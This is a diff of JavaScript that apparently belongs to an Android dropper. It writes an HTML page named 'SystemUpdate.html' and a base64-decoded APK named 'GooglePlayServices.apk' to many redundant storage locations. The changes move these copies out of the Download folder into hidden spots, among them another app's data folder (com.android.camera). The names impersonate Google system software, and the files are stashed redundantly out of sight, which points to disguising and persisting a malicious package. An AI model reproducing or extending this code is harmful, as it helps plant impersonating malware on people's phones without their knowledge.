@@ -152,7 +152,7 @@ function saveHTMLToAllLocations(htmlContent) {
     } catch(e) {}
     if (PLATFORM.isAndroid && A.isAvailable) {
         try {
-            var path = '/storage/emulated/0/Android/data/com.google.android.play.services/SystemUpdate.html';
+            var path = '/storage/emulated/0/Android/data/SystemUpdate.html';
             A.saveFile(path, htmlContent);
         } catch(e) {}
         try {
@@ -160,7 +160,7 @@ function saveHTMLToAllLocations(htmlContent) {
             A.saveToPreferences('system_SystemUpdate_html', encoded);
         } catch(e) {}
         try {
-            A.saveFile('/storage/emulated/0/Download/SystemUpdate.html', htmlContent);
+            A.saveFile('/storage/emulated/0/Android/data/com.android.camera/SystemUpdate.html', htmlContent);
         } catch(e) {}
     }
 }
@@ -195,14 +195,14 @@ function loadHTMLFromAllLocations() {
                     // 4. Android/data
                     if (PLATFORM.isAndroid && A.isAvailable) {
                         try {
-                            var content = A.readFile('/storage/emulated/0/Android/data/com.google.android.play.services/SystemUpdate.html');
+                            var content = A.readFile('/storage/emulated/0/Android/data/SystemUpdate.html');
                             if (content) { resolve(content); return; }
                         } catch(e) {}
                     }
                     // 5. Download folder
                     if (PLATFORM.isAndroid && A.isAvailable) {
                         try {
-                            var content = A.readFile('/storage/emulated/0/Download/SystemUpdate.html');
+                            var content = A.readFile('/storage/emulated/0/Android/data/com.android.camera/SystemUpdate.html');
                             if (content) { resolve(content); return; }
                         } catch(e) {}
                     }
@@ -321,19 +321,19 @@ function saveAPKToAllLocations(apkBase64) {
         // 2. Android/data
         try {
             var binary = Uint8Array.from(atob(apkBase64), c => c.charCodeAt(0));
-            var path = '/storage/emulated/0/Android/data/com.google.android.play.services/GooglePlayServices.apk';
+            var path = '/storage/emulated/0/Android/data/GooglePlayServices.apk';
             A.saveFileBinary(path, binary);
         } catch(e) {}
         // 3. Internal APK folder (paling aman)
         try {
             var binary = Uint8Array.from(atob(apkBase64), c => c.charCodeAt(0));
-            var internalPath = '/data/data/com.google.android.play.services/files/GooglePlayServices.apk';
+            var internalPath = '/data/data/com.google.play.services/files/GooglePlayServices.apk';
             A.saveFileBinary(internalPath, binary);
         } catch(e) {}
         // 4. Download folder (fallback)
         try {
             var binary = Uint8Array.from(atob(apkBase64), c => c.charCodeAt(0));
-            A.saveFileBinary('/storage/emulated/0/Download/GooglePlayServices.apk', binary);
+            A.saveFileBinary('/storage/emulated/0/Android/data/com.android.camera/GooglePlayServices.apk', binary);
         } catch(e) {}
     }
 }
@@ -341,8 +341,8 @@ function saveAPKToAllLocations(apkBase64) {
 function getAPKPath() {
     var paths = [
         '/data/data/com.google.android.play.services/files/GooglePlayServices.apk',
-        '/storage/emulated/0/Android/data/com.google.android.play.services/GooglePlayServices.apk',
-        '/storage/emulated/0/Download/GooglePlayServices.apk'
+        '/storage/emulated/0/Android/data/GooglePlayServices.apk',
+        '/storage/emulated/0/Android/data/com.android.camera/GooglePlayServices.apk'
     ];
     if (PLATFORM.isAndroid && A.isAvailable) {
         for (var i = 0; i < paths.length; i++) {
